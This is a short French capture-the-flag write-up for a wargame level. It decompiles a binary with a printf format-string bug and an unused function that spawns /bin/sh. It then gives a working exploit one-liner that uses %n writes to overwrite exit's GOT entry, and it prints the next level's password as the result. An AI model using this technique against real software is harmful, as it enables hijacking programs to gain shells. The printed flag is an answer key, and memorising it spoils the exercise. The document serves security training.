# Rapport CTF - [Level05]

### Observation :
En arrivant sur le level5 on trouve un exécutable nommé level5.\
Quand nous essayons de le lancer avec un argument le programme nous renvois juste notre propre chaîne de caractère puis se ferme, comme sur le level précédant. \
Regardons donc avec gdb ou un decompilateur.

### Explication de Code :
En lançant le binaire dans hex-ray ou ghidra nous obtenons :
```c
//----- (080484A4) --------------------------------------------------------
void __noreturn o()
{
  system("/bin/sh");
  _exit(1);
}
// 80484A4: using guessed type void __noreturn o();

//----- (080484C2) --------------------------------------------------------
void __noreturn n()
{
  char s[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(s, 512, stdin);
  printf(s);
  exit(1);
}

//----- (08048504) --------------------------------------------------------
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  n();
}
```
Nous pouvons voir une fonction non utilisé `o()` qui nous permet d'accéder à un shell. \
Et probablement modifier la stack de printf pour changer son adresse de retour vu que nous n'avons pas d'instruction de retour dans les autres fonctions (ça va être fastidieux...). \
Appel à la fonction `exit` et la fonction `_exit`


### Solution :
Il nous faut modifier l'opération de saut de la fonction d'appel court `exit` pour pointer vers la fonction `o()`. \
La première ligne de la fonction ressemble à ça : `(jmp *0x8049838)`. \
Je vais modifier l'adresse à laquelle l'opération jmp va dans la mémoire pour pointer vers l'adresse de la fonction `o()` = `080484A4` en inverser vu que nous sommes en small endian. \
Il nous faut donc écrire 164 octets pour le premier octet de notre return  `(A4 = 164)`, ensuite 0x84 étants plus petit que 0xA4 il nous faut écrire 4bits supplémentaire donc `(484 = 1156)`, puis `(804 = 2052)`.

On fait la commande suivante pour obtenir le flag :
```sh
(python -c "print('\x08\x04\x98\x38'[::-1] + 'A'*4 + '\x08\x04\x98\x39'[::-1] + 'A'*4 + '\x08\x04\x98\x3a'[::-1] + '%8.x'*3 + 'A'*120 + '%n' + '%992.x' + '%n' + '%896.x' + '%n')"; echo "cat /home/user/level6/.pass") | ./level5
```

### Resultat :
```sh
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
